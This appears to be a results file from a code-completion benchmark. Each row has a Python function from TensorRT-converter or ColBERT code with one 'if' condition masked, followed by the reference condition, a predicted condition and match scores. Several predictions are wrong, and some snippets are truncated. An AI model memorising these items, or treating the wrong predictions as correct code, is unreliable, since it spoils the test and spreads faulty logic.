"@tensorrt_converter('torch.ones') def convert_ones(ctx): size = ctx.method_args[0] if: size = ctx.method_args dtype = torch.float32 if 'dtype' in ctx.method_kwargs: dtype = ctx.method_kwargs['dtype'] output = ctx.method_return if isinstance(size, int): size = (size,) is_const = True for s in size: if hasattr(s, '_trt'): is_const = False break if is_const: output_trt = trt_(ctx.network, output) else: trt_size = [] for s in size: if hasattr(s, '_trt'): trt_size.append(s._trt) else: trt_size.append(trt_(ctx.network, s)) trt_size = ctx.network.add_concatenation(trt_size).get_output(0) layer = ctx.network.add_fill(size, trt.FillOperation.RANDOM_UNIFORM) layer.set_input(0, trt_size) layer.set_input(1, trt_(ctx.network, torch.tensor(1.0, dtype=dtype).cuda())) layer.set_input(2, trt_(ctx.network, torch.tensor(1.0, dtype=dtype).cuda())) output_trt = layer.get_output(0) data_type = None if dtype == torch.float32: data_type = trt.DataType.FLOAT elif dtype == torch.int32 or dtype == torch.long: data_type = trt.DataType.INT32 elif dtype == torch.bool: data_type = trt.DataType.BOOL else: print('unsupported convert type:{}'.format(dtype)) if data_type is not None: layer = ctx.network.add_identity(output_trt) layer.set_output_type(0, data_type) output_trt = layer.get_output(0) output._trt = output_trt","not isinstance(size, Iterable)","not isinstance(size, list)",0.0,64.34588841607616
"def get_intwarper_trt(other, ctx): if: return other._trt elif isinstance(other, int): return ctx.network.add_constant((1,), np.array([other], dtype=np.int32)).get_output(0) else: return other","isinstance(other, IntWarper)","hasattr(other, '_trt')",0.0,22.089591134157878
"@tensorrt_converter('torch2trt_dynamic.converters.size.IntWarper.__rsub__') def convert_intwarper_rsub(ctx): self = ctx.method_args[0] other = ctx.method_args[1] output = ctx.method_return trt_other = get_intwarper_trt(other, ctx) if: trt_value = ctx.network.add_elementwise(trt_other, self._trt, trt.ElementWiseOperation.SUB).get_output(0) ret = IntWarper(output) ret._trt = trt_value ctx.method_return = ret","isinstance(trt_other, trt.ITensor)","isinstance(trt_other, trt.ITensor)",1.0,100.00000000000004
"@tensorrt_converter('torch2trt_dynamic.converters.size.IntWarper.__rfloordiv__') def convert_intwarper_rfloordiv(ctx): self = ctx.method_args[0] other = ctx.method_args[1] output = ctx.method_return trt_other = get_intwarper_trt(other, ctx) if: trt_value = ctx.network.add_elementwise(trt_other, self._trt, trt.ElementWiseOperation.FLOOR_DIV).get_output(0) ret = IntWarper(output) ret._trt = trt_value ctx.method_return = ret","isinstance(trt_other, trt.ITensor)","isinstance(trt_other, trt.ITensor)",1.0,100.00000000000004
"@tensorrt_converter('torch.std') @tensorrt_converter('torch.Tensor.std') def convert_std(ctx): old_method_args = ctx.method_args old_method_kwargs = ctx.method_kwargs input = ctx.method_args[0] input_trt = trt_(ctx.network, input) output = ctx.method_return dim = get_arg(ctx, 'dim', pos=1, default=None) unbiased = get_arg(ctx, 'unbiased', pos=2, default=True) keepdim = get_arg(ctx, 'keepdim', pos=3, default=False) if: mean_val = input.mean(dim, True) ctx.method_args = [input, dim, True] ctx.method_kwargs = [] ctx.method_return = mean_val convert_mean(ctx) else: mean_val = input.mean() ctx.method_args = [input, None, False] ctx.method_kwargs = [] ctx.method_return = mean_val convert_mean(ctx) x_minus_mean = input - mean_val ctx.method_args = [input, mean_val] ctx.method_return = x_minus_mean convert_sub(ctx) x_pow = x_minus_mean * x_minus_mean ctx.method_args = [x_minus_mean, x_minus_mean] ctx.method_return = x_pow convert_mul(ctx) x_pow_trt = trt_(ctx.network, x_pow) if dim is None: dim = tuple(range(len(input.shape))) if isinstance(dim, list): dim = tuple(dim) if not isinstance(dim, tuple): dim = (dim,) dim = tuple([d if d >= 0 else len(input.shape) + d for d in dim]) axes = 0 for d in dim: axes |= 1 << d if unbiased: layer = ctx.network.add_reduce(x_pow_trt, trt.ReduceOperation.SUM, axes, keepdim) sum_trt = layer.get_output(0) shape_trt = tensor_trt_get_shape_trt(ctx.network, input_trt, dim[0],",dim is not None,dim is not None,1.0,100.00000000000004
"@tensorrt_converter('torch.Tensor.t') def convert_t(ctx): input = ctx.method_args[0] input_trt = trt_(ctx.network, input) output = ctx.method_return if: layer = ctx.network.add_identity(input_trt) output._trt = layer.get_output(0) else: ctx.method_args = [input, 1, 0] ctx.method_kwargs = {} convert_transpose(ctx)",len(input.shape) == 1,"isinstance(input_trt, torch.Tensor)",0.0,9.980099403873663
def trt_num_outputs(engine): count = 0 for i in range(engine.num_bindings): if: count += 1 return count,not engine.binding_is_input(i),engine.bindings[i] is not None and engine.outputs[i] is not None,0.0,5.0912128230977505
"def __bind_inputs(signature: inspect.Signature): nonlocal args, kwargs if: args = list() if kwargs is None: kwargs = dict() return signature.bind(*args, **kwargs).arguments",args is None,args is None,1.0,0.0
"def __init__(self, path=None, data=None): self.path = path if: assert isinstance(data, dict), type(data) self._load_data(data) or self._load_file(path)",data,data is not None,0.0,15.97357760615681
"def load_topK_pids(topK_path, qrels): topK_pids = defaultdict(list) topK_positives = defaultdict(list) print_message('#> Loading the top-k PIDs per query from', topK_path, '...') with open(topK_path) as f: for line_idx, line in enumerate(f): if line_idx and line_idx % (10 * 1000 * 1000) == 0: print(line_idx, end=' ', flush=True) qid, pid, *rest = line.strip().split('\t') qid, pid = (int(qid), int(pid)) topK_pids[qid].append(pid) assert len(rest) in [1, 2, 3] if len(rest) > 1: *_, label = rest label = int(label) assert label in [0, 1] if label >= 1: topK_positives[qid].append(pid) print() assert all((len(topK_pids[qid]) == len(set(topK_pids[qid])) for qid in topK_pids)) assert all((len(topK_positives[qid]) == len(set(topK_positives[qid])) for qid in topK_positives)) topK_positives = {qid: set(topK_positives[qid]) for qid in topK_positives} Ks = [len(topK_pids[qid]) for qid in topK_pids] print_message('#> max(Ks) =', max(Ks), ', avg(Ks) =', round(sum(Ks) / len(Ks), 2)) print_message('#> Loaded the top-k per query for', len(topK_pids), 'unique queries.\n') if: topK_positives = None else: assert len(topK_pids) >= len(topK_positives) for qid in set.difference(set(topK_pids.keys()), set(topK_positives.keys())): topK_positives[qid] = [] assert len(topK_pids) == len(",len(topK_positives) == 0,len(topK_pids) == 0,0.0,59.694917920196445
"def __init__(self, config, searcher, checkpoint=None): self.config = config self.searcher = searcher self.index_path = searcher.index self.has_checkpoint = False if: self.has_checkpoint = True self.checkpoint = Checkpoint(checkpoint, config) self.encoder = CollectionEncoder(config, self.checkpoint) self._load_disk_ivf() self.removed_pids = [] self.first_new_emb = torch.sum(self.searcher.ranker.doclens).item() self.first_new_pid = len(self.searcher.ranker.doclens)",checkpoint,checkpoint is not None,0.0,15.97357760615681
"def _get_chunk_idx(self, pid): for i in range(self.metadata['num_chunks']): chunk_metadata = self._load_chunk_metadata(i) if: return i raise ValueError('Passage ID out of range')",chunk_metadata['passage_offset'] <= pid and chunk_metadata['passage_offset'] + chunk_metadata['num_passages'] > pid,chunk_metadata['passage_id'] == pid,0.0,8.681327204190175
